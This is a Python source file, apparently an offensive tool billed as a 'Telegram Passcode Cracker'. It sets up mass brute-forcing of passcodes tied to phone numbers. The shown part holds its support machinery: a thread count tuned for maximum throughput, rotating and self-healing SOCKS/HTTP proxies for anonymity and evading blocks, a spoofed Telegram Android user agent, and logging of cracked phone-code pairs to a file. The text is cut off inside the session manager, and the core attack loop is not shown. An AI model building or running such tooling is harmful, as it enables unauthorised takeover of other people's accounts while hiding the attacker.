#!/usr/bin/env python3
"""
Telegram Passcode Cracker - Military Grade (2025)
------------------------------------------------
Real-time brute-force with live stats, zero delays, and maximum throughput.
Enhanced proxy handling with multi-protocol support and fallback mechanisms.
"""
import os
import sys
import time
import random
import threading
import requests
import socket
import signal
import json
import queue
import logging
import platform
import ipaddress
from termcolor import colored
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.live import Live

# =====================
# GLOBAL CONFIGURATION
# =====================
class Config:
    """Advanced configuration with dynamic optimization"""
    def __init__(self):
        # Core parameters
        self.VERSION = "3.3.0-ULTRA"
        self.MAX_THREADS = self._calculate_optimal_threads()
        self.REQUEST_TIMEOUT = 6  # Optimized timeout in seconds
        self.LIVE_STATS_INTERVAL = 0.2  # UI refresh rate (seconds)
        
        # Proxy configuration
        self.PROXY_PROTOCOLS = ["socks5", "socks4", "http"]  # Supported protocols
        self.PROXY_CHECK_URLS = [
            "https://api.telegram.org/api/ping", 
            "https://www.google.com", 
            "https://www.cloudflare.com"
        ]  # Multiple validation URLs
        self.PROXY_CHECK_TIMEOUT = 5  # Seconds to wait during proxy validation
        self.PROXY_HEALTH_CHECK_INTERVAL = 60  # Check proxy health every minute
        self.PROXY_REVIVAL_INTERVAL = 300  # Seconds before retrying failed proxies
        self.PROXY_VALIDATION_THREADS = 20  # Threads dedicated to proxy validation
        self.PROXY_VALIDATION_RETRIES = 2  # Retry count for validation
        self.PROXY_FALLBACK_MODE = True  # Enable direct connection if all proxies fail
        
        # Performance
        self.THROTTLE_CPU_THRESHOLD = 95  # CPU usage threshold for throttling
        self.LOG_LEVEL = logging.INFO
        self.CONNECTION_POOL_SIZE = 100
        self.SOCKET_TIMEOUT = (3, 6)  # Connect, read timeouts
        self.MAX_RETRIES = 2
        self.RETRY_BACKOFF = 1.5
        self.BATCH_SIZE = 5000  # Process codes in batches for better memory management
        
        # Load custom config if exists
        self._load_custom_config()
        
        # Publish configuration
        logging.info(f"Initialized configuration v{self.VERSION}")
        
    def _calculate_optimal_threads(self):
        """Calculate optimal thread count based on system capabilities"""
        try:
            import psutil
            cpu_count = psutil.cpu_count(logical=True)
            memory_gb = psutil.virtual_memory().total / (1024**3)
            
            # Base thread count on CPU cores, with higher ratio for higher core counts
            if cpu_count <= 4:
                thread_multiplier = 50
            elif cpu_count <= 8:
                thread_multiplier = 60
            else:
                thread_multiplier = 75
                
            # Adjust based on available memory (each thread ~2MB memory)
            mem_based_threads = int(memory_gb * 250)
            
            # Take minimum of CPU and memory-based calculations with a reasonable cap
            optimal_threads = min(cpu_count * thread_multiplier, mem_based_threads, 800)
            return max(50, optimal_threads)  # Minimum 50 threads
        except:
            # Fallback if psutil unavailable
            import multiprocessing
            try:
                cpu_count = multiprocessing.cpu_count()
                return cpu_count * 60
            except:
                return 200  # Safe default
                
    def _load_custom_config(self):
        """Load custom configuration from config.json if available"""
        try:
            if os.path.exists("config.json"):
                with open("config.json", "r") as f:
                    custom_config = json.load(f)
                    for key, value in custom_config.items():
                        if hasattr(self, key):
                            setattr(self, key, value)
                    logging.info("Loaded custom configuration from config.json")
        except Exception as e:
            logging.warning(f"Failed to load custom config: {e}")

# Initialize global configuration
CONFIG = Config()

# =====================
# SETUP LOGGING SYSTEM
# =====================
class LogManager:
    """Enhanced logging system with multi-level output"""
    def __init__(self):
        # Create log directory
        self.log_dir = "logs"
        os.makedirs(self.log_dir, exist_ok=True)
        
        # Configure root logger first with basic format
        logging.basicConfig(
            level=CONFIG.LOG_LEVEL,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        # Generate timestamp for log files
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Setup log files
        self.main_log = os.path.join(self.log_dir, f"attack_{self.timestamp}.log")
        self.success_log = os.path.join(self.log_dir, f"success_{self.timestamp}.log")
        self.proxy_log = os.path.join(self.log_dir, f"proxy_{self.timestamp}.log")
        self.stats_log = os.path.join(self.log_dir, f"stats_{self.timestamp}.log")
        self.error_log = os.path.join(self.log_dir, f"error_{self.timestamp}.log")
        
        # Add file handler to root logger
        file_handler = logging.FileHandler(self.main_log)
        file_handler.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
        logging.getLogger().addHandler(file_handler)
        
        # Setup specialized error logger
        error_handler = logging.FileHandler(self.error_log)
        error_handler.setLevel(logging.ERROR)
        error_handler.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
        logging.getLogger().addHandler(error_handler)
        
        # Setup specialized loggers
        self.success_logger = self._setup_logger('success', self.success_log)
        self.proxy_logger = self._setup_logger('proxy', self.proxy_log)
        self.stats_logger = self._setup_logger('stats', self.stats_log)
        
        # Log system info
        self._log_system_info()
        
    def _setup_logger(self, name, log_file):
        """Create a specialized logger instance"""
        handler = logging.FileHandler(log_file)
        handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
        
        logger = logging.getLogger(name)
        logger.setLevel(logging.INFO)
        logger.addHandler(handler)
        return logger
        
    def _log_system_info(self):
        """Log detailed system information"""
        logging.info(f"=== SYSTEM INFORMATION ===")
        logging.info(f"OS: {platform.system()} {platform.release()} ({platform.version()})")
        logging.info(f"Python: {platform.python_version()} ({platform.python_implementation()})")
        logging.info(f"Machine: {platform.machine()} - {platform.processor()}")
        
        try:
            import psutil
            logging.info(f"CPU: {psutil.cpu_count(logical=True)} logical cores, {psutil.cpu_count(logical=False)} physical cores")
            logging.info(f"Memory: {psutil.virtual_memory().total / (1024**3):.2f} GB total")
            logging.info(f"Disk: {psutil.disk_usage('/').total / (1024**3):.2f} GB total, {psutil.disk_usage('/').free / (1024**3):.2f} GB free")
        except ImportError:
            logging.info("Advanced system stats unavailable (psutil not installed)")
        
        logging.info(f"Network: {socket.gethostname()}")
        logging.info(f"=== CONFIGURATION ===")
        logging.info(f"Max Threads: {CONFIG.MAX_THREADS}")
        logging.info(f"Request Timeout: {CONFIG.REQUEST_TIMEOUT}s")
        logging.info(f"Proxy Protocols: {', '.join(CONFIG.PROXY_PROTOCOLS)}")
        logging.info(f"Fallback Mode: {'Enabled' if CONFIG.PROXY_FALLBACK_MODE else 'Disabled'}")
        
    def log_success(self, phone, code):
        """Log successful passcode crack"""
        message = f"CRACKED: {phone} -> {code}"
        self.success_logger.info(message)
        logging.info(colored(message, "green", attrs=["bold"]))
        
        # Write to cracked.txt for backward compatibility
        with open("cracked.txt", "a") as f:
            f.write(f"{phone}:{code}\n")
    
    def log_proxy_status(self, working, failed, blacklisted):
        """Log proxy status metrics"""
        self.proxy_logger.info(json.dumps({
            'timestamp': datetime.now().isoformat(),
            'working': working,
            'failed': failed,
            'blacklisted': blacklisted
        }))
    
    def log_stats(self, stats):
        """Log detailed attack statistics"""
        self.stats_logger.info(json.dumps({
            'timestamp': datetime.now().isoformat(),
            'attempted': stats.attempted,
            'total': stats.total,
            'progress': f"{stats.attempted/stats.total:.4f}",
            'speed': stats.codes_ps,
            'peak_speed': stats.peak_speed,
            'active_threads': stats.active_threads,
            'success': stats.success,
            'proxy_fails': stats.proxy_fails,
            'working_proxies': stats.working_proxies,
            'attack_efficiency': f"{stats.get_attack_efficiency():.2f}"
        }))

# =====================
# ENHANCED ATTACK STATS
# =====================
class AttackStats:
    """Real-time attack statistics with advanced metrics"""
    def __init__(self, total_codes):
        self.start_time = time.time()
        self.total = total_codes
        self.attempted = 0
        self.success = 0
        self.proxy_fails = 0
        self.lock = threading.RLock()  # Reentrant lock for nested access
        self.active_threads = 0
        self.codes_ps = 0  # Codes per second
        self.codes_ps_history = []  # Keep history for better averages
        self.last_update = time.time()
        self.peak_speed = 0
        self.working_proxies = 0
        self.total_proxies = 0
        self.consecutive_errors = 0
        self.success_rate = 0
        self.last_batch_size = 100  # Initial batch size for moving average
        self.moving_avg_window = 10  # Window size for moving averages
        self.attempt_history = {}  # Track attempt patterns
        self.last_stats_log = time.time()
        self.stats_log_interval = 5  # Log stats every 5 seconds
        
        # New fields for connection statistics
        self.direct_connection_attempts = 0
        self.protocol_stats = {protocol: 0 for protocol in CONFIG.PROXY_PROTOCOLS}
        self.protocol_success = {protocol: 0 for protocol in CONFIG.PROXY_PROTOCOLS}

    def update(self, success=False, proxy_fail=False, protocol=None):
        """Update attack statistics with new attempt data"""
        with self.lock:
            self.attempted += 1
            if success: 
                self.success += 1
                self.consecutive_errors = 0
                if protocol:
                    self.protocol_success[protocol] = self.protocol_success.get(protocol, 0) + 1
            if proxy_fail: 
                self.proxy_fails += 1
                self.consecutive_errors += 1
            else:
                self.consecutive_errors = 0
                
            # Track protocol usage
            if protocol:
                if protocol == "direct":
                    self.direct_connection_attempts += 1
                else:
                    self.protocol_stats[protocol] = self.protocol_stats.get(protocol, 0) + 1
                
            self.active_threads = threading.active_count() - 2  # Exclude main and display thread
            
            # Calculate real-time speed with moving average
            now = time.time()
            time_diff = now - self.last_update
            
            if time_diff >= 0.5:  # Update at least every half second
                current_speed = int((self.attempted - self.last_batch_size) / max(0.1, time_diff))
                self.last_batch_size = self.attempted
                self.last_update = now
                
                # Update moving average for speed
                self.codes_ps_history.append(current_speed)
                if len(self.codes_ps_history) > self.moving_avg_window:
                    self.codes_ps_history.pop(0)
                
                # Compute smoothed speed
                if self.codes_ps_history:
                    self.codes_ps = int(sum(self.codes_ps_history) / len(self.codes_ps_history))
                
                # Update peak speed
                if self.codes_ps > self.peak_speed:
                    self.peak_speed = self.codes_ps
                
                # Compute success rate
                if self.attempted > 0:
                    self.success_rate = (self.success / self.attempted) * 100
            
            # Log stats periodically
            if now - self.last_stats_log >= self.stats_log_interval:
                self._log_stats()
                self.last_stats_log = now
                
    def _log_stats(self):
        """Log periodic statistics"""
        try:
            with open(f"logs/stats_{datetime.now().strftime('%Y%m%d')}.csv", "a") as f:
                if f.tell() == 0:  # File is empty, add header
                    f.write("timestamp,attempted,total,speed,active_threads,success,proxy_fails,working_proxies\n")
                
                f.write(f"{datetime.now().isoformat()},{self.attempted},{self.total}," + 
                       f"{self.codes_ps},{self.active_threads},{self.success}," +
                       f"{self.proxy_fails},{self.working_proxies}\n")
        except Exception as e:
            logging.warning(f"Could not log stats: {e}")

    def get_eta(self):
        """Calculate estimated time to completion"""
        if self.codes_ps <= 0: 
            return "Calculating..."
        
        remaining = self.total - self.attempted
        eta_seconds = remaining // max(1, self.codes_ps)
        
        # Cap ETA at reasonable limit to avoid unrealistic estimates
        if eta_seconds > 100 * 24 * 3600:  # 100 days
            return "100+ days"
            
        return str(timedelta(seconds=eta_seconds))
    
    def get_attack_efficiency(self):
        """Calculate overall attack efficiency metric (0-100%)"""
        if self.attempted == 0:
            return 0
            
        # Compute weighted efficiency based on multiple factors
        speed_factor = min(1.0, self.codes_ps / max(1, self.peak_speed or 1)) * 0.5
        thread_usage = min(1.0, self.active_threads / max(1, CONFIG.MAX_THREADS)) * 0.3
        proxy_health = (1.0 - min(1.0, (self.proxy_fails / max(1, self.attempted)))) * 0.2
        
        return (speed_factor + thread_usage + proxy_health) * 100

# =====================
# PROXY DATA MODEL
# =====================
class ProxyInfo:
    """Enhanced proxy data model with protocol support"""
    def __init__(self, host, port, location=None):
        self.host = host
        self.port = port
        self.location = location
        self.protocol = None  # Will be determined during validation
        self.latency = None
        self.success_count = 0
        self.fail_count = 0
        self.last_success = 0
        self.last_used = 0
        self.status = "unknown"  # unknown, working, failed, blacklisted
        
        # Track which protocols have been tested
        self.tested_protocols = set()
    
    def __str__(self):
        if self.host == "DIRECT":
            return "DIRECT CONNECTION"
        protocol_str = f"{self.protocol}://" if self.protocol else ""
        return f"{protocol_str}{self.host}:{self.port}"
    
    def get_address(self):
        """Get proxy address in format host:port"""
        return f"{self.host}:{self.port}"
    
    def get_url(self):
        """Get proxy URL with protocol"""
        if self.host == "DIRECT":
            return None
        if not self.protocol:
            return None
        return f"{self.protocol}://{self.host}:{self.port}"
    
    def to_dict(self):
        """Convert to dictionary for serialization"""
        return {
            "host": self.host,
            "port": self.port,
            "protocol": self.protocol,
            "location": self.location,
            "latency": self.latency,
            "success_count": self.success_count,
            "fail_count": self.fail_count,
            "status": self.status
        }
    
    def is_direct(self):
        """Check if this is a direct connection"""
        return self.host == "DIRECT"

# =====================
# ADVANCED PROXY VALIDATION AND MANAGEMENT
# =====================
class ProxyValidator:
    """Advanced proxy validation system with multi-protocol support"""
    def __init__(self):
        self.timeout = CONFIG.PROXY_CHECK_TIMEOUT
        self.test_urls = CONFIG.PROXY_CHECK_URLS
        self.protocols = CONFIG.PROXY_PROTOCOLS
        self.executor = ThreadPoolExecutor(max_workers=CONFIG.PROXY_VALIDATION_THREADS)
        self.futures = []
        self.results = {}
        self.lock = threading.RLock()
    
    def validate_proxy(self, proxy_info):
        """Test a single proxy with multiple protocols and return the best result"""
        best_result = {'status': 'failed', 'error': 'All protocols failed', 'protocol': None, 'latency': 999}
        
        # Special case for direct connection
        if proxy_info.is_direct():
            try:
                start_time = time.time()
                response = requests.get(
                    self.test_urls[0],
                    timeout=self.timeout,
                    headers={'User-Agent': 'TelegramAndroid/8.4.1'}
                )
                latency = time.time() - start_time
                
                if response.status_code < 400:
                    return {
                        'status': 'working',
                        'protocol': 'direct',
                        'latency': latency,
                        'code': response.status_code
                    }
                else:
                    return {'status': 'failed', 'protocol': 'direct', 'error': f'HTTP {response.status_code}'}
            except Exception as e:
                return {'status': 'failed', 'protocol': 'direct', 'error': str(e)[:100]}
        
        # Test with all protocols
        proxy_address = proxy_info.get_address()
        
        for protocol in self.protocols:
            # Skip already tested protocols
            if protocol in proxy_info.tested_protocols:
                continue
                
            proxy_info.tested_protocols.add(protocol)
            
            # Test with all URLs until one works
            for test_url in self.test_urls:
                try:
                    proxies = {
                        "http": f"{protocol}://{proxy_address}",
                        "https": f"{protocol}://{proxy_address}"
                    }
                    
                    # Measure proxy performance
                    start_time = time.time()
                    response = requests.get(
                        test_url,
                        proxies=proxies,
                        timeout=self.timeout,
                        headers={
                            'User-Agent': 'TelegramAndroid/8.4.1 (SDK 26)',
                            'Connection': 'close'
                        }
                    )
                    latency = time.time() - start_time
                    
                    if response.status_code < 400:
                        result = {
                            'status': 'working',
                            'protocol': protocol,
                            'latency': latency,
                            'code': response.status_code,
                            'url': test_url
                        }
                        
                        # If we found a working protocol, return it immediately
                        if latency < best_result.get('latency', 999):
                            best_result = result
                            
                        break  # No need to try other URLs for this protocol
                except requests.exceptions.RequestException:
                    continue  # Try next URL
                except Exception as e:
                    continue  # Try next URL
        
        # If we found at least one working protocol
        if best_result['status'] == 'working':
            return best_result
            
        return {'status': 'failed', 'error': 'All protocols and URLs failed', 'proxy': proxy_address}
    
    def validate_proxies_batch(self, proxies):
        """Validate a batch of proxies in parallel with multiple protocols"""
        with self.lock:
            self.futures = []
            self.results = {}
            
            # Submit all validation tasks
            for proxy in proxies:
                future = self.executor.submit(self.validate_proxy, proxy)
                self.futures.append((future, proxy))
            
            # Wait for all to complete with progress tracking
            total = len(self.futures)
            completed = 0
            
            logging.info(f"Validating {total} proxies with {len(self.protocols)} protocols...")
            
            working_proxies = []
            failed_proxies = []
            
            for future, proxy in self.futures:
                try:
                    result = future.result(timeout=self.timeout * 2)  # Double timeout for batch operations
                    proxy_key = proxy.get_address() if not proxy.is_direct() else "DIRECT"
                    self.results[proxy_key] = result
                    
                    # Update proxy with results
                    if result.get('status') == 'working':
                        proxy.status = "working"
                        proxy.latency = result.get('latency')
                        proxy.protocol = result.get('protocol')
                        working_proxies.append(proxy)
                    else:
                        proxy.status = "failed"
                        failed_proxies.append(proxy)
                        
                except Exception as e:
                    proxy_key = proxy.get_address() if not proxy.is_direct() else "DIRECT"
                    self.results[proxy_key] = {
                        'status': 'failed', 
                        'error': f'Validation exception: {str(e)[:50]}'
                    }
                    proxy.status = "failed"
                    failed_proxies.append(proxy)
                
                completed += 1
                if completed % 20 == 0 or completed == total:
                    logging.info(f"Proxy validation: {completed}/{total} ({completed/total:.1%})")
            
            # Sort working proxies by latency
            working_proxies.sort(key=lambda p: p.latency or 999)
            
            # Log protocol statistics
            protocol_counts = {}
            for proxy in working_proxies:
                if proxy.protocol:
                    protocol_counts[proxy.protocol] = protocol_counts.get(proxy.protocol, 0) + 1
            
            protocol_stats = ", ".join([f"{proto}: {count}" for proto, count in protocol_counts.items()])
            logging.info(f"Proxy validation complete: {len(working_proxies)} working ({protocol_stats}), {len(failed_proxies)} failed")
            
            return working_proxies, failed_proxies
    
    def get_proxy_metrics(self):
        """Get metrics of validated proxies"""
        with self.lock:
            if not self.results:
                return []
                
            metrics = []
            for proxy_addr, result in self.results.items():
                if result.get('status') == 'working':
                    metrics.append({
                        'proxy': proxy_addr,
                        'protocol': result.get('protocol'),
                        'latency': result.get('latency', 999),
                        'status': 'working'
                    })
            
            # Sort by latency
            metrics.sort(key=lambda x: x['latency'])
            return metrics
    
    def shutdown(self):
        """Clean shutdown of the validator"""
        self.executor.shutdown(wait=False)

class ProxyManager:
    """Advanced proxy management with multi-protocol support"""
    def __init__(self, log_manager):
        self.log_manager = log_manager
        self.proxies = []  # All ProxyInfo objects
        self.lock = threading.RLock()
        self.working_proxies = []  # List of working ProxyInfo objects
        self.failed_proxies = {}  # Dict of failed ProxyInfo objects with timestamp
        self.blacklisted = set()  # Set of blacklisted ProxyInfo objects
        self.proxy_queue = queue.Queue()  # Queue for proxy distribution
        self.validator = ProxyValidator()
        self.last_health_check = time.time()
        self.direct_connection_enabled = False  # Flag for direct connection mode
        
        # Load proxies with extended format support
        self._load_proxies()
        
        # Initialize with validation
        self._initial_validation()
        
        # Start health monitor thread
        self.health_thread = threading.Thread(target=self._health_monitor, daemon=True)
        self.health_thread.start()
        
    def _load_proxies(self):
        """Load proxies from file with enhanced format support"""
        if not os.path.exists("proxy.txt"):
            logging.warning("proxy.txt not found! Creating a sample file.")
            with open("proxy.txt", "w") as f:
                f.write("# Add your proxies in format: IP:PORT or IP:PORT:LOCATION\n")
                f.write("# Examples:\n")
                f.write("127.0.0.1:9050\n")
                f.write("8.8.8.8:1080:Google DNS\n")
        
        valid_proxies = []
        total_lines = 0
        
        with open("proxy.txt") as f:
            for line_number, line in enumerate(f, 1):
                line = line.strip()
                total_lines += 1
                
                # Skip empty lines and comments
                if not line or line.startswith('#'):
                    continue
                
                # Parse extended proxy format (IP:PORT:LOCATION)
                parts = line.split(':')
                
                try:
                    # Handle various formats:
                    # 1. IP:PORT
                    # 2. IP:PORT:LOCATION
                    # 3. IP:PORT:LOCATION:ADDITIONAL_INFO
                    if len(parts) >= 2:
                        host = parts[0]
                        try:
                            port = int(parts[1])
                        except ValueError:
                            logging.warning(f"Line {line_number}: Invalid port number in '{line}'")
                            continue
                            
                        # Check if host is a valid IP or hostname
                        try:
                            ipaddress.ip_address(host)  # Validate as IP
                        except ValueError:
                            # Not an IP, validate as hostname
                            if not all(c.isalnum() or c in '.-' for c in host):
                                logging.warning(f"Line {line_number}: Invalid hostname '{host}' in '{line}'")
                                continue
                        
                        # Check port range
                        if not (0 < port < 65536):
                            logging.warning(f"Line {line_number}: Invalid port '{port}' in '{line}'")
                            continue
                        
                        # Extract location if available
                        location = None
                        if len(parts) >= 3:
                            location = ':'.join(parts[2:])  # Join all remaining parts as location
                        
                        # Create ProxyInfo object
                        proxy_info = ProxyInfo(host, port, location)
                        valid_proxies.append(proxy_info)
                    else:
                        logging.warning(f"Line {line_number}: Invalid proxy format '{line}', expected at least IP:PORT")
                except Exception as e:
                    logging.warning(f"Line {line_number}: Error parsing proxy '{line}': {e}")
        
        # Add direct connection as a fallback
        if CONFIG.PROXY_FALLBACK_MODE:
            direct_proxy = ProxyInfo("DIRECT", 0, "Direct Connection")
            valid_proxies.append(direct_proxy)
        
        self.proxies = valid_proxies
        logging.info(f"Loaded {len(valid_proxies)} proxies from file (from {total_lines} total lines)")
        
        if len(valid_proxies) < 2 and not CONFIG.PROXY_FALLBACK_MODE:  # Only the direct proxy
            logging.warning("Very few proxies available. Consider adding more to proxy.txt.")
    
    def _initial_validation(self):
        """Perform initial validation of all proxies"""
        logging.info("Starting initial proxy validation...")
        working, failed = self.validator.validate_proxies_batch(self.proxies)
        
        with self.lock:
            self.working_proxies = working
            for proxy in failed:
                self.failed_proxies[proxy] = time.time()
            
            # Initialize proxy queue with working proxies
            for proxy in self.working_proxies:
                self.proxy_queue.put(proxy)
                
                # Check if direct connection is in working proxies
                if proxy.is_direct():
                    self.direct_connection_enabled = True
        
        # Log status
        self.log_manager.log_proxy_status(
            len(self.working_proxies), 
            len(self.failed_proxies), 
            len(self.blacklisted)
        )
        
        # Handle case where no proxies are working
        if not self.working_proxies and CONFIG.PROXY_FALLBACK_MODE:
            logging.warning("No working proxies found! Enabling direct connection mode.")
            direct_proxy = ProxyInfo("DIRECT", 0, "Direct Connection (Fallback)")
            direct_proxy.protocol = "direct"
            direct_proxy.status = "working"
            self.working_proxies.append(direct_proxy)
            self.proxy_queue.put(direct_proxy)
            self.direct_connection_enabled = True
            
            # Log updated status
            self.log_manager.log_proxy_status(
                len(self.working_proxies), 
                len(self.failed_proxies), 
                len(self.blacklisted)
            )
        elif not self.working_proxies:
            logging.error("FATAL: No working proxies found and fallback mode disabled")
            logging.error("Please add working proxies to proxy.txt or enable PROXY_FALLBACK_MODE in config.json")
            
            # Generate a helpful sample config file
            if not os.path.exists("config.json"):
                sample_config = {
                    "PROXY_FALLBACK_MODE": True,
                    "PROXY_PROTOCOLS": ["socks5", "socks4", "http"],
                    "PROXY_CHECK_TIMEOUT": 5
                }
                try:
                    with open("config.json", "w") as f:
                        json.dump(sample_config, f, indent=4)
                    logging.info("Created sample config.json with PROXY_FALLBACK_MODE enabled")
                except:
                    pass
                    
            sys.exit(1)
            
        logging.info(f"Proxy validation complete: {len(self.working_proxies)} working, {len(failed)} failed")
        
        # Check if we're running with direct connection only
        if len(self.working_proxies) == 1 and self.working_proxies[0].is_direct():
            logging.warning("Running in DIRECT CONNECTION mode without proxies! This is not anonymous.")
    
    def _health_monitor(self):
        """Background thread to monitor proxy health and restore failed proxies"""
        while True:
            try:
                time.sleep(10)  # Check every 10 seconds
                
                now = time.time()
                if now - self.last_health_check < CONFIG.PROXY_HEALTH_CHECK_INTERVAL:
                    continue
                    
                self.last_health_check = now
                logging.debug("Running proxy health check...")
                
                # Identify proxies to retry
                retry_proxies = []
                with self.lock:
                    for proxy, fail_time in list(self.failed_proxies.items()):
                        if now - fail_time > CONFIG.PROXY_REVIVAL_INTERVAL:
                            retry_proxies.append(proxy)
                
                if retry_proxies:
                    logging.info(f"Retrying {len(retry_proxies)} previously failed proxies")
                    working, still_failed = self.validator.validate_proxies_batch(retry_proxies)
                    
                    with self.lock:
                        # Update working proxies
                        for proxy in working:
                            if proxy in self.failed_proxies:
                                del self.failed_proxies[proxy]
                            if proxy not in self.working_proxies:
                                self.working_proxies.append(proxy)
                                self.proxy_queue.put(proxy)
                            proxy.status = "working"
                        
                        # Update failed proxies with new timestamp
                        for proxy in still_failed:
                            self.failed_proxies[proxy] = now
                            proxy.status = "failed"
                    
                    # Log status update
                    self.log_manager.log_proxy_status(
                        len(self.working_proxies), 
                        len(self.failed_proxies), 
                        len(self.blacklisted)
                    )
                
                # If working proxies are low, attempt emergency recovery
                with self.lock:
                    if not self.direct_connection_enabled and len(self.working_proxies) < max(3, len(self.proxies) * 0.1):
                        self._emergency_proxy_recovery()
            
            except Exception as e:
                logging.error(f"Error in proxy health monitor: {e}")
    
    def _emergency_proxy_recovery(self):
        """Emergency recovery mode when working proxies are critically low"""
        logging.warning("EMERGENCY: Working proxies critically low, attempting recovery")
        
        # Try to recover blacklisted proxies first
        if self.blacklisted:
            recovery_candidates = list(self.blacklisted)[:20]  # Try up to 20
            self.blacklisted -= set(recovery_candidates)
            
            # Move to failed for normal retry
            for proxy in recovery_candidates:
                self.failed_proxies[proxy] = time.time() - CONFIG.PROXY_REVIVAL_INTERVAL + 60
                proxy.status = "failed"  # Mark as failed for retry
            
            logging.info(f"Emergency recovery: moved {len(recovery_candidates)} from blacklist to retry queue")
        
        # If still critical, retry all failed proxies immediately
        if len(self.working_proxies) < 3 and self.failed_proxies:
            retry_all = list(self.failed_proxies.keys())
            working, still_failed = self.validator.validate_proxies_batch(retry_all)
            
            for proxy in working:
                if proxy in self.failed_proxies:
                    del self.failed_proxies[proxy]
                if proxy not in self.working_proxies:
                    self.working_proxies.append(proxy)
                    self.proxy_queue.put(proxy)
                proxy.status = "working"
            
            logging.info(f"Emergency recovery: recovered {len(working)} proxies")
            
            # If still no working proxies, enable direct connection if allowed
            if not self.working_proxies and CONFIG.PROXY_FALLBACK_MODE:
                logging.critical("CRITICAL: No working proxies available after emergency recovery!")
                
                # Create direct connection proxy as last resort
                direct_proxy = ProxyInfo("DIRECT", 0, "Direct Connection (Emergency)")
                direct_proxy.status = "working"
                direct_proxy.protocol = "direct"
                self.working_proxies.append(direct_proxy)
                self.proxy_queue.put(direct_proxy)
                self.direct_connection_enabled = True
                logging.critical("EMERGENCY MODE: Activated direct connection (NO PROXY)")
    
    def get_proxy(self):
        """Get next available proxy with intelligent selection"""
        with self.lock:
            if self.proxy_queue.empty():
                # Refresh queue if we have working proxies but queue is empty
                if self.working_proxies:
                    # Sort by performance and shuffle top performers
                    top_proxies = sorted(
                        self.working_proxies,
                        key=lambda p: p.latency or 999
                    )
                    
                    # Take top 50% and shuffle them for distribution
                    top_half = top_proxies[:max(1, len(top_proxies) // 2)]
                    random.shuffle(top_half)
                    
                    # Add to queue
                    for proxy in top_half + top_proxies[len(top_half):]:
                        self.proxy_queue.put(proxy)
                elif CONFIG.PROXY_FALLBACK_MODE and not self.direct_connection_enabled:
                    # If we have no working proxies and fallback is enabled, add direct connection
                    logging.warning("No working proxies available, enabling direct connection")
                    direct_proxy = ProxyInfo("DIRECT", 0, "Direct Connection (Fallback)")
                    direct_proxy.protocol = "direct"
                    direct_proxy.status = "working"
                    self.working_proxies.append(direct_proxy)
                    self.proxy_queue.put(direct_proxy)
                    self.direct_connection_enabled = True
                else:
                    logging.error("No working proxies available")
                    return None
            
            try:
                proxy = self.proxy_queue.get(timeout=1)
                
                # Update last used timestamp
                proxy.last_used = time.time()
                
                return proxy
            except queue.Empty:
                logging.error("Proxy queue unexpectedly empty")
                return None

    def mark_result(self, proxy, success):
        """Record proxy result (success or failure)"""
        if not proxy:
            return
            
        with self.lock:
            # For direct connection, don't track metrics
            if proxy.is_direct():
                return
                
            # Update performance metrics
            if success:
                proxy.success_count += 1
                proxy.last_success = time.time()
            else:
                proxy.fail_count += 1
            
            # Calculate failure ratio for proxies with sufficient attempts
            total_attempts = proxy.success_count + proxy.fail_count
            if total_attempts >= 10:
                fail_ratio = proxy.fail_count / total_attempts
                
                # If proxy has high failure rate, blacklist it
                if fail_ratio > 0.9:  # 90% failure rate
                    if proxy in self.working_proxies:
                        self.working_proxies.remove(proxy)
                    if proxy in self.failed_proxies:
                        del self.failed_proxies[proxy]
                    self.blacklisted.add(proxy)
                    proxy.status = "blacklisted"
                    logging.debug(f"Blacklisted proxy {proxy} due to high failure rate ({fail_ratio:.1%})")
                    return
            
            # Handle immediate result
            if not success:
                if proxy in self.working_proxies:
                    self.working_proxies.remove(proxy)
                self.failed_proxies[proxy] = time.time()
                proxy.status = "failed"
            else:
                # If it was a success, make sure it's in working list
                if proxy not in self.working_proxies:
                    self.working_proxies.append(proxy)
                    self.proxy_queue.put(proxy)
                if proxy in self.failed_proxies:
                    del self.failed_proxies[proxy]
                proxy.status = "working"

    def update_stats(self, stats):
        """Update attack stats with proxy information"""
        with self.lock:
            stats.working_proxies = len(self.working_proxies)
            stats.total_proxies = len(self.proxies)
            
            # Log status
            self.log_manager.log_proxy_status(
                len(self.working_proxies), 
                len(self.failed_proxies), 
                len(self.blacklisted)
            )
    
    def get_proxy_details(self):
        """Get detailed information about all proxies"""
        with self.lock:
            result = {
                "working": [p.to_dict() for p in self.working_proxies],
                "failed": [p.to_dict() for p in self.failed_proxies.keys()],
                "blacklisted": [p.to_dict() for p in self.blacklisted],
                "total": len(self.proxies),
                "direct_enabled": self.direct_connection_enabled
            }
            return result
    
    def shutdown(self):
        """Clean shutdown of the proxy manager"""
        self.validator.shutdown()
        logging.info("Proxy manager shutdown complete")

# =====================
# HTTP SESSION MANAGER
# =====================
class SessionManager:
    """Optimized HTTP session pool with connection reuse"""
    def __init__(self):
        self.session_pool = queue.Queue()
        self.pool_size = CONFIG.CONNECTION_POOL_SIZE
        self.initialize_pool()
        self.lock = threading.RLock()
        self.active_sessions = 0
    
    def initialize_pool(self):
        """Initialize session pool"""
        for _ in range(self.pool_size):
            session = self._create_optimized_session()
            self.session_pool.put(session)
        logging.info(f"Initialized connection pool with {self.pool_size} sessions")
    
    def _create_optimized_session(self):
        """Create an optimized HTTP session"""
        session = requests.Session()
        
        # Configure connection pooling
        adapter = requests.adapters.HTTPAdapter(
            max_retries=CONFIG.MAX_RETRIES,
            pool_connections=5,
            pool_maxsize=10
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Initialize proxies attribute
        session.proxies = {}
        
        # Optimize headers
        session.headers.update({
            'User-Agent': 'TelegramAndroid/8.4.1 (SDK 26; Android 8.0.0; Pixel 2)',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        })
        
        return session
    
    def get_session(self):
        """Get a session from the pool or create new if needed"""
        try:
            session = self.session_pool.get(block=False)
            with self.lock:
                self.active_sessions += 1
            return session
        except queue.Empty:
